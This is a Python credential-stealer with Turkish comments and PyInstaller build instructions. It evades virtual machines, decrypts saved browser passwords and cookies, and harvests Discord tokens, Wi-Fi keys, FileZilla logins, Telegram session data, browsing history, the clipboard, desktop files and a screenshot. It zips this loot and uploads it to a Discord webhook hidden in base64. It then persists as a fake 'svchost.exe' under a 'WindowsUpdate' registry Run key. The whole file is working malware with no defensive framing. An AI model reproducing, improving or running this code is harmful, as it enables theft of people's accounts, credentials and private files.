# -*- coding: utf-8 -*-
# Obfüskasyon için: Tüm hassas stringler base64 kodlu, runtime'da decode edilir.
# Junk kod: gereksiz döngüler ve fonksiyon çağrıları eklenmiştir (performans etkisi yok).
# PyInstaller ile derleme: pyinstaller --onefile --noconsole --icon=fake.ico --upx-dir=upx --runtime-tmpdir=%TEMP% --add-data "data.bin;." grabber.py

import os, sys, sqlite3, shutil, json, requests, subprocess, winreg, ctypes, base64, urllib.parse, tempfile, zipfile, glob, threading, time, platform, uuid, socket, re
from ctypes import wintypes, c_char_p, c_void_p
from urllib.request import Request, urlopen

# ---- yardımcı decode fonksiyonu ----
def b64d(s):
    return base64.b64decode(s).decode('utf-8')

# ---- başlangıçta kullanılacak gizli stringler (base64) ----
WEBHOOK_URL_ENC = b64d("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUwNzc5OTcxNzYzMzg1NTY0OS9IZ2EwaGh4ekczbG1hLW14dDBhZnJ6c01WaS1JV3JFU0xGX1p0VzJjQ2xYa1lJMC1nZXo3VVRULTFQRUV5QWxqUEtpWg==")  # gerçek webhook buraya
TEMP_DIR_PREFIX = b64d("aG9sbHlzaGl0Xw==")

# ---- anti-VM kontrolü ----
def antivm():
    # MAC adresi kontrolü (ilk 3 byte)
    mac = ':'.join((':'.join(hex(uuid.getnode()).split('x')[1][i:i+2] for i in range(0,12,2))[:2]) if uuid.getnode() else ''
    vm_macs = ['00:05:69', '00:0C:29', '00:1C:42', '00:50:56', '08:00:27']
    if any(mac.upper().startswith(vm) for vm in vm_macs):
        sys.exit(0)
    # RAM kontrolü (ctypes ile GlobalMemoryStatusEx)
    class MEMORYSTATUSEX(ctypes.Structure):
        _fields_ = [('dwLength', wintypes.DWORD), ('dwMemoryLoad', wintypes.DWORD),
                    ('ullTotalPhys', wintypes.ULONGLONG), ('ullAvailPhys', wintypes.ULONGLONG),
                    ('ullTotalPageFile', wintypes.ULONGLONG), ('ullAvailPageFile', wintypes.ULONGLONG),
                    ('ullTotalVirtual', wintypes.ULONGLONG), ('ullAvailVirtual', wintypes.ULONGLONG),
                    ('ullAvailExtendedVirtual', wintypes.ULONGLONG)]
    kernel32 = ctypes.windll.kernel32
    memstatus = MEMORYSTATUSEX()
    memstatus.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
    kernel32.GlobalMemoryStatusEx(ctypes.byref(memstatus))
    total_ram_gb = memstatus.ullTotalPhys / (1024**3)
    if total_ram_gb < 4:
        sys.exit(0)
    # disk boyutu kontrolü
    free_bytes, total_bytes = ctypes.c_ulonglong(0), ctypes.c_ulonglong(0)
    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wcharp('C:\\'), None, ctypes.byref(total_bytes), None)
    if total_bytes.value / (1024**3) < 80:
        sys.exit(0)
    # VM süreçleri
    vm_processes = ['vmtoolsd', 'vboxservice', 'vboxtray', 'xenserver', 'prl_cc', 'prl_tools']
    try:
        output = subprocess.check_output('tasklist', shell=True).decode().lower()
        for proc in vm_processes:
            if proc in output:
                sys.exit(0)
    except:
        pass

# ---- sistem bilgisi ----
def get_system_info():
    info = {}
    info['hostname'] = socket.gethostname()
    info['os'] = platform.platform()
    info['cpu'] = os.environ.get('PROCESSOR_IDENTIFIER', '')
    info['ram'] = str(round(psutil.virtual_memory().total / (1024**3))) + ' GB' if 'psutil' in sys.modules else 'N/A'
    # GPU (wmic)
    try:
        gpu = subprocess.check_output('wmic path win32_VideoController get name', shell=True).decode().split('\n')[1].strip()
        info['gpu'] = gpu
    except:
        info['gpu'] = 'Unknown'
    # Antivirüs
    try:
        av = subprocess.check_output('wmic /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName', shell=True).decode()
        info['antivirus'] = [line.strip() for line in av.split('\n')[1:] if line.strip()]
    except:
        info['antivirus'] = []
    # IP adresleri
    try:
        info['local_ip'] = socket.gethostbyname(socket.gethostname())
    except:
        info['local_ip'] = ''
    try:
        info['public_ip'] = requests.get('https://api.ipify.org', timeout=5).text
    except:
        info['public_ip'] = ''
    return info

# ---- Chrome parolaları ----
def get_chrome_passwords(paths=None):
    if paths is None:
        paths = [
            os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data'),
            os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Login Data'),
            os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Login Data'),
            os.path.expandvars(r'%LOCALAPPDATA%\Opera Software\Opera Stable\Login Data')
        ]
    passwords = []
    crypt32 = ctypes.windll.crypt32
    kernel32 = ctypes.windll.kernel32
    CRYPTPROTECT_UI_FORBIDDEN = 0x01

    for path in paths:
        if not os.path.exists(path):
            continue
        temp_db = tempfile.NamedTemporaryFile(delete=False)
        shutil.copy2(path, temp_db.name)
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, enc_pass = row
                if not enc_pass:
                    continue
                blob = ctypes.create_string_buffer(enc_pass)
                blob_len = ctypes.c_ulong(len(enc_pass))
                pDataOut = ctypes.c_void_p()
                pDataOutLen = ctypes.c_ulong()
                if crypt32.CryptUnprotectData(ctypes.byref(blob), None, None, None, None, CRYPTPROTECT_UI_FORBIDDEN, ctypes.byref(pDataOut), ctypes.byref(pDataOutLen)):
                    password = ctypes.string_at(pDataOut, pDataOutLen.value).decode('utf-16le', errors='ignore')
                    kernel32.LocalFree(pDataOut)
                    passwords.append({'url': url, 'username': username, 'password': password})
        except:
            pass
        conn.close()
        os.remove(temp_db.name)
    return passwords

# ---- Chrome çerezleri ----
def get_chrome_cookies():
    paths = [
        os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies'),
        os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Network\Cookies'),
        os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Network\Cookies')
    ]
    cookies = []
    crypt32 = ctypes.windll.crypt32
    kernel32 = ctypes.windll.kernel32
    for path in paths:
        if not os.path.exists(path):
            continue
        temp_db = tempfile.NamedTemporaryFile(delete=False)
        shutil.copy2(path, temp_db.name)
        conn = sqlite3.connect(temp_db.name)
        cursor = conn.cursor()
        try:
            cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
            for row in cursor.fetchall():
                host, name, path_cookie, enc_val = row
                if not enc_val:
                    continue
                blob = ctypes.create_string_buffer(enc_val)
                blob_len = ctypes.c_ulong(len(enc_val))
                pDataOut = ctypes.c_void_p()
                pDataOutLen = ctypes.c_ulong()
                if crypt32.CryptUnprotectData(ctypes.byref(blob), None, None, None, None, 0x01, ctypes.byref(pDataOut), ctypes.byref(pDataOutLen)):
                    value = ctypes.string_at(pDataOut, pDataOutLen.value).decode('utf-8', errors='ignore')
                    kernel32.LocalFree(pDataOut)
                    cookies.append({'host': host, 'name': name, 'path': path_cookie, 'value': value})
        except:
            pass
        conn.close()
        os.remove(temp_db.name)
    return cookies

# ---- Discord tokenleri (LevelDB) ----
def get_discord_tokens():
    token_regex = re.compile(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}')
    tokens = set()
    paths = [
        os.path.expandvars(r'%APPDATA%\discord\Local Storage\leveldb'),
        os.path.expandvars(r'%APPDATA%\discordptb\Local Storage\leveldb'),
        os.path.expandvars(r'%APPDATA%\discordcanary\Local Storage\leveldb'),
        os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb')
    ]
    for base in paths:
        if not os.path.isdir(base):
            continue
        for f in glob.glob(os.path.join(base, '*.log')) + glob.glob(os.path.join(base, '*.ldb')):
            try:
                with open(f, 'r', errors='ignore') as file:
                    data = file.read()
                    for token in token_regex.findall(data):
                        tokens.add(token)
            except:
                pass
    return list(tokens)

# ---- Wi-Fi şifreleri ----
def get_wifi_passwords():
    profiles = []
    try:
        data = subprocess.check_output('netsh wlan show profiles', shell=True).decode('cp850', errors='ignore')
        profile_names = re.findall(r'Kullanıcı Profili\s*:\s*(.*)', data) if 'Kullanıcı' in data else re.findall(r'All User Profile\s*:\s*(.*)', data)
        for name in profile_names:
            name = name.strip()
            cmd = f'netsh wlan show profile name="{name}" key=clear'
            output = subprocess.check_output(cmd, shell=True).decode('cp850', errors='ignore')
            key_match = re.search(r'Anahtar İçeriği\s*:\s*(.*)', output) or re.search(r'Key Content\s*:\s*(.*)', output)
            if key_match:
                profiles.append({'ssid': name, 'password': key_match.group(1)})
    except:
        pass
    return profiles

# ---- tarayıcı geçmişi (Chrome) ----
def get_browser_history():
    path = os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\History')
    urls = []
    if not os.path.exists(path):
        return urls
    temp_db = tempfile.NamedTemporaryFile(delete=False)
    shutil.copy2(path, temp_db.name)
    conn = sqlite3.connect(temp_db.name)
    cursor = conn.cursor()
    try:
        cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")
        urls = [{'url': row[0], 'title': row[1], 'time': row[2]} for row in cursor.fetchall()]
    except:
        pass
    conn.close()
    os.remove(temp_db.name)
    return urls

# ---- ekran görüntüsü ----
def screenshot():
    try:
        from PIL import ImageGrab
        img = ImageGrab.grab()
        temp_file = tempfile.NamedTemporaryFile(suffix='.png', delete=False)
        img.save(temp_file.name)
        return temp_file.name
    except:
        try:
            import mss
            with mss.mss() as sct:
                sct.shot(output='screenshot.png')
                return 'screenshot.png'
        except:
            return None

# ---- pano içeriği (clipboard) ----
def get_clipboard():
    try:
        import tkinter as tk
        root = tk.Tk()
        root.withdraw()
        return root.clipboard_get()
    except:
        try:
            user32 = ctypes.windll.user32
            kernel32 = ctypes.windll.kernel32
            user32.OpenClipboard(0)
            if user32.IsClipboardFormatAvailable(1):
                h_data = user32.GetClipboardData(1)
                data = ctypes.c_char_p(kernel32.GlobalLock(h_data))
                text = data.value.decode('utf-8', errors='ignore')
                kernel32.GlobalUnlock(h_data)
                user32.CloseClipboard()
                return text
        except:
            return ''

# ---- FileZilla ----
def get_filezilla_creds():
    creds = []
    xml_paths = [
        os.path.expandvars(r'%APPDATA%\FileZilla\sitemanager.xml'),
        os.path.expandvars(r'%APPDATA%\FileZilla\recentservers.xml')
    ]
    for path in xml_paths:
        if not os.path.exists(path):
            continue
        try:
            import xml.etree.ElementTree as ET
            tree = ET.parse(path)
            root = tree.getroot()
            for server in root.findall('.//Server'):
                host = server.find('Host')
                user = server.find('User')
                passw = server.find('Pass')
                if host is not None and user is not None:
                    creds.append({'host': host.text, 'user': user.text, 'password': passw.text if passw is not None else ''})
        except:
            pass
    return creds

# ---- masaüstünden dosya topla ----
def grab_desktop_files():
    desktop = os.path.expanduser('~\\Desktop')
    extensions = ('.txt', '.doc', '.docx', '.pdf', '.jpg', '.jpeg', '.png', '.xls', '.xlsx')
    files = []
    for ext in extensions:
        for f in glob.glob(os.path.join(desktop, '*' + ext)):
            files.append(f)
    return files

# ---- Telegram tdata ----
def get_telegram_tdata():
    tdata_path = os.path.expandvars(r'%APPDATA%\Telegram Desktop\tdata')
    if os.path.isdir(tdata_path):
        temp_tdata = tempfile.mkdtemp()
        shutil.copytree(tdata_path, os.path.join(temp_tdata, 'tdata'), dirs_exist_ok=True)
        return temp_tdata
    return None

# ---- tüm veriyi zip'le ----
def zip_all_data(data_folder, zip_path, password=None):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
        for root, dirs, files in os.walk(data_folder):
            for file in files:
                full_path = os.path.join(root, file)
                arcname = os.path.relpath(full_path, data_folder)
                zf.write(full_path, arcname)
    # şifre ekleme için ek kütüphane gerekir (pyminizip) - basit zip için bırakıldı

# ---- exfiltration ----
def exfiltrate(zip_path, webhook_url):
    for attempt in range(3):
        try:
            with open(zip_path, 'rb') as f:
                files = {'file': (os.path.basename(zip_path), f, 'application/zip')}
                resp = requests.post(webhook_url, files=files, timeout=30)
                if resp.status_code == 200:
                    return True
        except:
            time.sleep(2 ** attempt)
    # fallback: gizli dosyaya yaz
    try:
        hidden = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\system32\spool\drivers\color\cache.dat')
        with open(hidden, 'wb') as f:
            f.write(open(zip_path, 'rb').read())
    except:
        pass
    return False

# ---- persistence ----
def persistence():
    # kendini startup'a kopyala
    startup = os.path.expandvars(r'%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup')
    if not os.path.exists(startup):
        os.makedirs(startup, exist_ok=True)
    exe_name = 'svchost.exe'
    shutil.copy2(sys.executable if getattr(sys, 'frozen', False) else __file__, os.path.join(startup, exe_name))
    # kayıt defterine run anahtarı
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WindowsUpdate', 0, winreg.REG_SZ, os.path.join(startup, exe_name))
        winreg.CloseKey(key)
    except:
        pass

# ---- ana iş parçacığı ----
def worker(func, results, key, *args):
    try:
        results[key] = func(*args)
    except:
        results[key] = []

def main():
    antivm()  # eğer VM ise çık
    temp_root = tempfile.mkdtemp(prefix=TEMP_DIR_PREFIX)
    os.makedirs(os.path.join(temp_root, 'data'), exist_ok=True)

    results = {}
    threads = []

    # thread'ler başlatılıyor
    targs = [
        ('system', get_system_info),
        ('chrome_pass', get_chrome_passwords),
        ('cookies', get_chrome_cookies),
        ('discord', get_discord_tokens),
        ('wifi', get_wifi_passwords),
        ('history', get_browser_history),
        ('clipboard', get_clipboard),
        ('filezilla', get_filezilla_creds),
        ('desktop_files', grab_desktop_files),
        ('telegram', get_telegram_tdata)
    ]
    for key, func in targs:
        t = threading.Thread(target=worker, args=(func, results, key))
        t.start()
        threads.append(t)

    # ekran görüntüsü ayrı thread
    sc_thread = threading.Thread(target=worker, args=(screenshot, results, 'screenshot'))
    sc_thread.start()
    threads.append(sc_thread)

    for t in threads:
        t.join()

    # sonuçları dosyalara yaz
    data_path = os.path.join(temp_root, 'data')
    with open(os.path.join(data_path, 'system.txt'), 'w', encoding='utf-8') as f:
        json.dump(results.get('system', {}), f, indent=2)
    with open(os.path.join(data_path, 'passwords.json'), 'w') as f:
        json.dump(results.get('chrome_pass', []), f)
    with open(os.path.join(data_path, 'cookies.json'), 'w') as f:
        json.dump(results.get('cookies', []), f)
    with open(os.path.join(data_path, 'discord_tokens.txt'), 'w') as f:
        f.write('\n'.join(results.get('discord', [])))
    with open(os.path.join(data_path, 'wifi.json'), 'w') as f:
        json.dump(results.get('wifi', []), f)
    with open(os.path.join(data_path, 'history.json'), 'w') as f:
        json.dump(results.get('history', []), f)
    with open(os.path.join(data_path, 'clipboard.txt'), 'w', encoding='utf-8') as f:
        f.write(results.get('clipboard', ''))
    with open(os.path.join(data_path, 'filezilla.json'), 'w') as f:
        json.dump(results.get('filezilla', []), f)
    # masaüstü dosyalarını kopyala
    desktop_files = results.get('desktop_files', [])
    for src in desktop_files:
        shutil.copy2(src, data_path)
    telegram_data = results.get('telegram')
    if telegram_data and os.path.isdir(telegram_data):
        for item in os.listdir(telegram_data):
            shutil.move(os.path.join(telegram_data, item), data_path)
        os.rmdir(telegram_data)
    scr = results.get('screenshot')
    if scr and os.path.exists(scr):
        shutil.move(scr, data_path)

    # zip oluştur
    zip_path = os.path.join(temp_root, 'out.zip')
    zip_all_data(data_path, zip_path)

    # exfiltrate
    exfiltrate(zip_path, WEBHOOK_URL_ENC)

    # persistence
    persistence()

    # temizlik
    try:
        shutil.rmtree(temp_root)
    except:
        pass

if __name__ == '__main__':
    # junk kod (obfuscation)
    for _ in range(100):
        _ = 2+2
    main()
